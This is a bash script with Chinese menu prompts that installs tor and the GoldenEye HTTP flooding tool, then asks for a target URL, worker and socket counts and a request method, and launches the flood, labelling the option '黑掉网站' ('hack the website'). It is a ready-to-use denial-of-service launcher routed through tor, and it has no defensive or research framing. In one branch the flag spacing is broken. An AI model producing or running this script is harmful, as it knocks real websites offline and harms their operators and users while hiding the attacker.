#!/bin/bash
#yum install screen -y
#screen -S goldeneye
echo -n "1.安装goldeneye 2.黑掉网站 3.退出(1/2/3）:"
# 保存用户输入的值到val中
read val
case $val in
1) 
# 用户输入Y或y 
echo "loading"
yum update -y
yum install git wget -y
wget http://dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-9.noarch.rpm
rpm -ivh epel-release-7-9.noarch.rpm
yum install tor -y
#mkdir hello && cd hello
git clone https://github.com/jseidl/GoldenEye.git
cd GoldenEye
chmod +x goldeneye.py 
echo "done! enjoy"
echo -n "1.开始黑掉网站 2.之后尝试(1/2):"

# 保存用户输入的值到val中
read val2

case $val2 in
1) 
read -p "Input website: (需加上http／https)" website
read -p "Input workers: （默认100）" workers
read -p "Input sockets: （默认200）" sockets
read -p "Input method: （默认random,可选get,post,random）" method
echo -n "are you ready(Y/N):"

# 保存用户输入的值到val中
read val1

case $val1 in
Y|y) 
# 用户输入Y或y 
service tor start
cd GoldenEye
./goldeneye.py $website - w ${workers:-100} - s ${sockets:-200} - m ${method:-'random'}
;;
N|n)
# 用户输入N或n
echo "it's ok"
exit 0
;; 
*)
# 其它输入
echo "incorrect input"
;; 
esac 
exit 0
;;
2)
exit 0
;;
esac
;;
2)
read -p "Input website: (需加上http／https)" website
read -p "Input workers: （默认100）" workers
read -p "Input sockets: （默认200）" sockets
read -p "Input method: （默认random,可选get,post,random）" method

echo -n "are you ready(Y/N):"

# 保存用户输入的值到val中
read val1

case $val1 in
Y|y) 
# 用户输入Y或y 
service tor start
cd GoldenEye
./goldeneye.py $website -w ${workers:-100} -s ${sockets:-200} -m ${method:-'random'}
;;
N|n)
# 用户输入N或n
echo "it's ok"
exit 0
;; 
*)
# 其它输入
echo "incorrect input"
;; 
esac 
exit 0
;;
3)
exit 0
;; 
*)

echo "incorrect input"
;; 
esac 
exit 0


